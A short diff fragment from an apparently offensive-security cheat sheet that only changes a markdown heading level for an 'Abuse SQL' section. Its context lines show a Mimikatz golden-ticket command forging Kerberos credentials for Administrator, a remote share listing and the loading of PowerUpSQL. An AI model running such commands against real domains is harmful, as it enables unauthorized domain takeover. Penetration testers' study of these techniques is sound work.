@@ -1097,7 +1097,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain>
 ls \\<servername>\<share>\
 ```
 
-### Abuse SQL
+## Abuse SQL
 ```
 . .\PowerUpSQL.ps1
 ```
